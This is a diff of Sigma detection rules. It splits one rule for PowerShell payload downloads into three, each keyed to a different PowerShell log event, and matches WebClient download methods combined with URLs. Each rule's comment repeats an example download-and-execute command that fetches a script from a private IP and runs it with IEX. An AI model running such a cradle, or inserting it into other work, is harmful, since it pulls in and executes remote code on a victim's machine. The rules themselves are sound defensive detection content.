@@ -1,4 +1,8 @@
-title: Payload downloaded via PowerShell
+title: Payload downloaded via PowerShell - ps_module
+id: 4b65234e-afc7-49d7-8f34-aa54db5a7fdf
+related:
+  - id: b9dc502f-040b-404a-a1e6-51a9960e000c
+    type: similar
 description: Detects scenarios where an attacker download a payload using PowerShell.
 references:
 - https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0002-Execution/T1059.001-PowerShell
@@ -10,56 +14,114 @@ references:
 tags:
 - attack.execution
 - attack.t1059.001 # Command and Scripting Interpreter: PowerShell 
-- attack.command_and_control
+- attack.command-and-control
 - attack.t1105 # Ingress Tool Transfer
 author: mdecrevoisier
 logsource:
   product: windows
-  category:
-    - ps_module
-    - ps_classic_script
-    - ps_script
+  category: ps_module
 detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
-  selection_powershell_native:
-    EventID: 800
-    EventData|contains: 'WebClient'
-    EventData|contains:
-      - ".DownloadString("
-      - ".DownloadStringAsync("
-      - ".DownloadFile("
-      - ".DownloadData("
-    EventData|contains: 
-      - 'http://'
-      - 'https://'
-      - 'ftp://'
-
   selection_powershell_modern:
     EventID: 4103
     Payload|contains: 'WebClient'
+  and_selection_powershell_modern_2:
     Payload|contains:
       - ".DownloadString("
       - ".DownloadStringAsync("
       - ".DownloadFile("
       - ".DownloadData("
+  and_selection_powershell_modern_3:
     Payload|contains: 
       - 'http://'
       - 'https://'
       - 'ftp://'
+  condition: (selection_powershell_modern and all of and_selection_powershell_modern_*)
+falsepositives:
+- Scripts donwloading files
+level: high
 
+---
+title: Payload downloaded via PowerShell - ps_classic_script
+id: 264dde24-e8ad-492b-a294-88810a96e7bf
+related:
+  - id: 4b65234e-afc7-49d7-8f34-aa54db5a7fdf
+    type: similar
+description: Detects scenarios where an attacker download a payload using PowerShell.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0002-Execution/T1059.001-PowerShell
+- https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/
+- https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
+- https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign
+- https://unit42.paloaltonetworks.com/mallox-ransomware/
+- https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
+tags:
+- attack.execution
+- attack.t1059.001 # Command and Scripting Interpreter: PowerShell 
+- attack.command-and-control
+- attack.t1105 # Ingress Tool Transfer
+author: mdecrevoisier
+logsource:
+  product: windows
+  category: ps_classic_script
+detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
+  selection_powershell_native:
+    EventID: 800
+    EventData|contains: 'WebClient'
+  and_selection_powershell_native_2:
+    EventData|contains:
+      - ".DownloadString("
+      - ".DownloadStringAsync("
+      - ".DownloadFile("
+      - ".DownloadData("
+  and_selection_powershell_native_3:
+    EventData|contains: 
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+  condition: (selection_powershell_native and all of and_selection_powershell_native_*)
+falsepositives:
+- Scripts donwloading files
+level: high
+
+---
+title: Payload downloaded via PowerShell - ps_script
+id: 9e4aa266-1cbd-4754-a800-eee662db2a49
+related:
+  - id: 4b65234e-afc7-49d7-8f34-aa54db5a7fdf
+    type: similar
+description: Detects scenarios where an attacker download a payload using PowerShell.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0002-Execution/T1059.001-PowerShell
+- https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/
+- https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
+- https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign
+- https://unit42.paloaltonetworks.com/mallox-ransomware/
+- https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
+tags:
+- attack.execution
+- attack.t1059.001 # Command and Scripting Interpreter: PowerShell 
+- attack.command-and-control
+- attack.t1105 # Ingress Tool Transfer
+author: mdecrevoisier
+logsource:
+  product: windows
+  category: ps_script
+detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
   selection_powershell_block:
     EventID: 4104
     ScriptBlockText|contains: 'WebClient'
+  and_selection_powershell_block_2:
     ScriptBlockText|contains:
       - ".DownloadString("
       - ".DownloadStringAsync("
       - ".DownloadFile("
       - ".DownloadData("
+  and_selection_powershell_block_3:
     ScriptBlockText|contains: 
       - 'http://'
       - 'https://'
       - 'ftp://'
-
-  condition: selection_powershell_native or selection_powershell_modern or selection_powershell_block
+  condition: (selection_powershell_block and all of and_selection_powershell_block_*)
 falsepositives:
 - Scripts donwloading files
 level: high
